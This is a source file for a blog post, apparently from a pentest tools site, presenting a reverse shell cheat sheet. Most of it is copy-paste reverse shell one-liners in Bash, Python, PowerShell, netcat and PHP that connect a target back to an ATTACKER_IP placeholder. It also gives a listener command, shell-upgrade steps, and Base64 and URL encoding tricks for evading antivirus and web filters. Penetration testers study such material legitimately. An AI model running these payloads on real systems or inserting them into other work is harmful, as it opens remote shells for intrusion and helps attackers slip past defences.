import type { BlogPost } from "@/lib/blog";

export const meta: BlogPost = {
  slug: "reverse-shell-cheat-sheet",
  title: "Reverse Shell Cheat Sheet 2026 — One-Liners for Every Language",
  description:
    "Complete reverse shell cheat sheet with one-liners in Bash, Python, PowerShell, PHP, Ruby, Perl, Netcat, and more. Copy-paste ready for your next pentest.",
  date: "2026-03-08",
  author: "4252nez",
  keywords: [
    "reverse shell cheat sheet",
    "reverse shell one liner",
    "bash reverse shell",
    "python reverse shell",
    "powershell reverse shell",
    "netcat reverse shell",
    "pentest cheat sheet",
    "how to use reverse shells",
  ],
  relatedTool: "revshell",
};

export function Content() {
  return (
    <>
      <p>
        A reverse shell is one of the most fundamental techniques in penetration
        testing. When you find a command injection vulnerability or gain code
        execution on a target, a reverse shell gives you an interactive session
        to work with — connecting the target back to your machine.
      </p>
      <p>
        This guide covers reverse shell one-liners for every common language and
        scenario you'll encounter during engagements. Every command listed here
        is also available in our{" "}
        <a href="/tools/revshell">Reverse Shell Generator</a> with encoding
        options.
      </p>

      <h2>How Reverse Shells Work</h2>
      <p>
        In a reverse shell, the target machine initiates a connection back to the
        attacker. This is the opposite of a bind shell, where the attacker
        connects to a port opened on the target. Reverse shells are preferred
        because outbound connections are far less likely to be blocked by
        firewalls.
      </p>
      <p>The basic flow is:</p>
      <ol>
        <li>
          <strong>Set up a listener</strong> on your attack machine (e.g.,{" "}
          <code>nc -lvnp 4444</code>)
        </li>
        <li>
          <strong>Execute the reverse shell payload</strong> on the target
        </li>
        <li>
          <strong>The target connects back</strong> to your listener, giving you
          a shell
        </li>
      </ol>

      <h2>Bash Reverse Shells</h2>
      <p>
        Bash reverse shells are the go-to when you know the target is running a
        Linux system with Bash installed. They use the{" "}
        <code>/dev/tcp</code> pseudo-device.
      </p>
      <pre>
        <code>bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1</code>
      </pre>
      <p>
        If <code>/dev/tcp</code> isn't available (some stripped-down
        containers), try the mkfifo approach with netcat instead.
      </p>

      <h2>Python Reverse Shells</h2>
      <p>
        Python is installed on most Linux systems and many Windows targets.
        Python reverse shells are reliable and give you a PTY.
      </p>
      <pre>
        <code>
          {`python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'`}
        </code>
      </pre>
      <p>
        The <code>pty.spawn</code> call is important — it gives you a proper
        interactive terminal rather than a dumb shell. Without it, you won't
        get tab completion, arrow keys, or job control.
      </p>

      <h2>PowerShell Reverse Shells</h2>
      <p>
        For Windows targets, PowerShell is your best option. It's installed by
        default on every modern Windows system.
      </p>
      <pre>
        <code>
          {`powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`}
        </code>
      </pre>
      <p>
        For AV evasion, consider Base64 encoding the payload and using{" "}
        <code>powershell -e [base64]</code>. Our{" "}
        <a href="/tools/revshell">generator</a> handles this encoding
        automatically.
      </p>

      <h2>Netcat Reverse Shells</h2>
      <p>
        Netcat is the Swiss Army knife of networking. The{" "}
        <code>-e</code> flag is the simplest approach, but it's not available
        in every version.
      </p>
      <pre>
        <code>nc ATTACKER_IP 4444 -e /bin/bash</code>
      </pre>
      <p>
        If <code>-e</code> isn't available, use the mkfifo method:
      </p>
      <pre>
        <code>
          rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc
          ATTACKER_IP 4444 &gt;/tmp/f
        </code>
      </pre>

      <h2>PHP Reverse Shells</h2>
      <p>
        Common in web application exploitation, especially against WordPress
        and other PHP-based CMS platforms.
      </p>
      <pre>
        <code>
          {`php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("bash <&3 >&3 2>&3");'`}
        </code>
      </pre>

      <h2>Upgrading Your Shell</h2>
      <p>
        Once you have a reverse shell, you'll want to upgrade it to a fully
        interactive TTY. The standard approach:
      </p>
      <pre>
        <code>
          {`python3 -c 'import pty;pty.spawn("/bin/bash")'
# Then press Ctrl+Z to background
stty raw -echo; fg
# Then type: export TERM=xterm`}
        </code>
      </pre>
      <p>This gives you tab completion, command history, and Ctrl+C support.</p>

      <h2>When to Use Each Type</h2>
      <ul>
        <li>
          <strong>Bash</strong> — Linux targets, simplest option when Bash is
          available
        </li>
        <li>
          <strong>Python</strong> — Cross-platform, gives you a PTY out of the
          box
        </li>
        <li>
          <strong>PowerShell</strong> — Windows targets, no additional tools
          needed
        </li>
        <li>
          <strong>Netcat</strong> — When nc is installed, most reliable
        </li>
        <li>
          <strong>PHP</strong> — Web app exploitation, command injection in PHP
          apps
        </li>
        <li>
          <strong>Socat</strong> — When you need encrypted or advanced shells
        </li>
      </ul>

      <h2>Encoding for Evasion</h2>
      <p>
        Many WAFs and input filters block common reverse shell characters like
        pipes, redirects, and semicolons. Encoding your payload can bypass
        these:
      </p>
      <ul>
        <li>
          <strong>Base64</strong> — Most common, works with{" "}
          <code>echo [payload] | base64 -d | bash</code>
        </li>
        <li>
          <strong>URL encoding</strong> — Useful for web-based command injection
        </li>
        <li>
          <strong>Double URL encoding</strong> — Bypasses filters that decode
          once before checking
        </li>
      </ul>
      <p>
        Our <a href="/tools/revshell">Reverse Shell Generator</a> supports all
        of these encoding methods — select your language, enter your IP and
        port, choose an encoding, and copy the result.
      </p>

      <h2>CLI Version</h2>
      <p>
        Prefer working from the terminal? Install the CLI version via pip:
      </p>
      <pre>
        <code>pip install offseckit</code>
      </pre>
      <p>Then generate shells directly from your terminal:</p>
      <pre>
        <code>{`osk revshell -i 10.10.10.10 -p 4444 -l python
osk revshell -i 10.10.10.10 -l bash -e base64
osk revshell -i 10.10.10.10 -l netcat --all`}</code>
      </pre>
      <p>
        Source code and full documentation on{" "}
        <a href="https://github.com/offseckit/revshell">GitHub</a>.
      </p>
    </>
  );
}
